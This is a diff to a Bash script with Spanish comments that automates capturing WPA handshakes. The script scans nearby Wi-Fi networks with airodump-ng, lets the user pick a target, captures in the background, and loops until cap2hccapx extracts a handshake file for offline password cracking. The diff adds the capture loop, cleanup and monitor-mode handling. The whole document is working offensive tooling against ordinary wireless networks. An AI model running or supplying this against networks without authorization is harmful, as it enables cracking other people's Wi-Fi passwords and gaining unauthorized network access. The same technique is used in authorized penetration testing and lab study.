@@ -1,4 +1,18 @@
 #!/bin/bash
+# Capturar la señal SIGINT y ejecutar la función cleanup
+trap cleanup SIGINT
+#trap cleanup ERR
+
+# Función para limpiar antes de salir
+cleanup() {
+    echo "Saliendo del script..."
+    killall airodump-ng
+    rm captura-01.cap
+    rm captura-01.csv
+    rm output-01.csv
+    rm captmp.cap
+    exit 1
+}
 
 # Mostrar las interfaces disponibles
 echo "Interfaces disponibles:"
@@ -32,6 +46,7 @@ if [[ "$interfaz" == *mon ]]; then
   if [[ "$1" = "-d" ]]; then
     echo "Desactivando el modo monitor..."
     airmon-ng stop $interfaz
+    NetworkManager start
     exit 0
   fi
 else
@@ -48,7 +63,7 @@ fi
 echo "Buscando redes Wifi (Esper 5 Segundos)..."
 
 # Escanear las redes wifi disponibles durante 10 segundos
-sudo timeout 5s airodump-ng --write output --output-format csv  --write-interval 1 --showack $interfaz >/dev/null
+sudo timeout 5s airodump-ng --write output --output-format csv  --write-interval 1 --showack $interfaz > /dev/null
 
 # Mostrar la lista de redes wifi disponibles con un número de selección
 echo "Redes Wi-Fi disponibles:"
@@ -70,8 +85,21 @@ rm output.csv
 echo "SSID: $ssid"
 echo "MAC : $mac"
 echo "CH  : $channel"
+echo ""
 
 #Empezamos a Capturar los paquetes de la red Seleccionada a la espera del Handshake
-sudo airodump-ng -c $channel --bssid $mac --output-format cap -w captura $interfaz
-cap2hccapx captura-01.cap $ssid.hccapx
+sudo airodump-ng -c $channel --bssid $mac --output-format cap,csv -w captura $interfaz > /dev/null 2>&1 &
+
+handshakes=0
+while [ $(expr $handshakes) -lt 1 ]
+do
+  sleep 5
+  echo -n "."
+  cp captura-01.cap captmp.cap
+  handshakes=$(cap2hccapx captmp.cap $ssid.hccapx | grep -oP "Written \K\d+(?= WPA Handshakes)") > /dev/null 
+done
+echo "Handshake Encontrado. Terminando..."
+killall airodump-ng
+rm captmp.cap
 mv captura-01.cap $ssid.cap
+mv captura-01.csv $ssid.csv
